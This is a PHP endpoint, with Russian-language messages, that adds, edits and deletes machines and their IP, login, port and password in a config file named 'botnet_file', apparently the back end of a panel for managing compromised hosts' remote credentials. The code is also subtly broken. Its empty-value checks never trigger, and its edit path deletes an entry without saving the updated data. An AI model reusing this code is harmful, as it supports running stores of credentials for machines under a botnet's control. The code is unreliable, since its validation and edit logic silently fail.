<?php

    include __DIR__ . '/../config.php';

    header('Content-Type: application/json');

    $name = isset($_POST['name']) ? $_POST['name'] : '';
    $ip = isset($_POST['ip']) ? $_POST['ip'] : '';
    $login = isset($_POST['login']) ? $_POST['login'] : '';
    $port = isset($_POST['port']) ? $_POST['port'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    $method = isset($_POST['method']) ? $_POST['method'] : '';
    $key = isset($_POST['key']) ? $_POST['key'] : '';

    function onEncode($text, $key, $cipher) {

        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $raw = openssl_encrypt($text, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac('sha256', $raw, $key, $as_binary = true);
        $encode = base64_encode($iv . $hmac . $raw);

        return $encode;

    }

    if ($key == $get_config['key']) {

        if ($method == 'del') {

            $fileContents = file_get_contents("json/" . $get_config['botnet_file']);

            $config = json_decode($fileContents, true);

            if (isset($config[$name])) {

                if ($name == null and $name == "") {

                    print_R (

                        json_encode (

                            array (

                                "message" => "Нельзя использовать пустые строки в Name",

                            ),

                        )

                    );

                    return false;

                } else {

                    unset($config[$name]);

                    $newFileContents = json_encode($config);

                    file_put_contents("json/" . $get_config['botnet_file'], $newFileContents);

                    print_R (

                        json_encode (

                            array (

                                "message" => "Машина успешно удалена из базы",

                            ),

                        )

                    );

                    return true;

                }

            } else {

                print_R (

                    json_encode (

                        array (

                            "message" => "Машина не найдена в базе",

                        ),

                    )

                );

                return false;

            }

        } elseif ($method == 'edit') {

            if ($name == null and $name == "") {

                print_R (

                    json_encode (

                        array (

                           "message" => "Нельзя использовать пустые строки в Name",

                        ),

                    )

                );

                return false;

            } elseif ($ip == null and $ip == "") {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать пустые строки в IP",

                        ),

                    )

                );

                return false;

            } elseif (!(filter_var($ip, FILTER_VALIDATE_IP))) {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать буквы или спецсимволы в IP",

                        ),

                    )

                );

                return false;

            } elseif ($login == null and $login == "") {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать пустые строки в Login",

                        ),

                    )

                );

                return false;

            } elseif ($port == null and $port == "") {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать пустые строки в Port",

                        ),

                    )

                );

                return false;

            } elseif (!ctype_digit($port)) {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать буквы или спецсимволы в Port",

                        ),

                    )

                );

                return false;

            } elseif ($password == null and $password == "") {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать пустые строки в Password",

                        ),

                    )

                );

                return false;

            } else {

                $fileContents = file_get_contents("json/" . $get_config['botnet_file']);

                $config = json_decode($fileContents, true);

                if (!array_key_exists($name, $config)) {

                    print_R (

                        json_encode (

                            array (

                                "message" => "Данной машины не найдено в базе",

                            ),

                        )

                    );

                    return false;

                }

                unset($config[$name]);

                $newFileContents = json_encode($config);

                file_put_contents("json/" . $get_config['botnet_file'], $newFileContents);

                $config[$name] = array (

                    'ip' => onEncode($ip, $get_config['key'], "AES-128-CBC"),
                    'login' => onEncode($login, $get_config['key'], "AES-128-CBC"),
                    'port' => onEncode($port, $get_config['key'], "AES-128-CBC"),
                    'password' => onEncode($password, $get_config['key'], "AES-128-CBC"),

                );

                print_R (

                    json_encode (

                        array (

                            "message" => "Данные машины успешно обновлены",

                        ),

                    )

                );

                return true;

            }

        } elseif ($method == 'add') {

            if ($name == null and $name == "") {

                print_R (

                    json_encode (

                        array (

                           "message" => "Нельзя использовать пустые строки в Name",

                        ),

                    )

                );

                return false;

            } elseif ($ip == null and $ip == "") {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать пустые строки в IP",

                        ),

                    )

                );

                return false;

            } elseif (!(filter_var($ip, FILTER_VALIDATE_IP))) {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать буквы или спецсимволы в IP",

                        ),

                    )

                );

                return false;

            } elseif ($login == null and $login == "") {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать пустые строки в Login",

                        ),

                    )

                );

                return false;

            } elseif ($port == null and $port == "") {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать пустые строки в Port",

                        ),

                    )

                );

                return false;

            } elseif (!ctype_digit($port)) {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать буквы или спецсимволы в Port",

                        ),

                    )

                );

                return false;

            } elseif ($password == null and $password == "") {

                print_R (

                    json_encode (

                        array (

                            "message" => "Нельзя использовать пустые строки в Password",

                        ),

                    )

                );

                return false;

            } else {

                $fileContents = file_get_contents("json/" . $get_config['botnet_file']);

                $config = json_decode($fileContents, true);

                foreach ($config as $get_name => $info) {

                    if ($get_name == $name) {

                        print_R (

                            json_encode (

                                array (

                                    "message" => "Данная машина уже есть в базе",

                                ),

                            )

                        );

                        return true;

                    }

                }

                $config[$name] = array (

                    'ip' => onEncode($ip, $get_config['key'], "AES-128-CBC"),
                    'login' => onEncode($login, $get_config['key'], "AES-128-CBC"),
                    'port' => onEncode($port, $get_config['key'], "AES-128-CBC"),
                    'password' => onEncode($password, $get_config['key'], "AES-128-CBC"),

                );

                $newFileContents = json_encode($config);

                file_put_contents("json/" . $get_config['botnet_file'], $newFileContents);

                print_R (

                    json_encode (

                        array (

                            "message" => "Машина успешно добавлена в базу",

                        ),

                    )

                );

                return true;

            }

        } else {

            print_R (

                json_encode (

                    array (

                        "message" => "Недопустимый метод",

                    ),

                )

            );

            return false;

        }

    } else {

        print_R (

            json_encode (

                array (

                    "message" => "Не найден ключ или введен неверно",

                ),

            )

        );

        return false;

    }

?>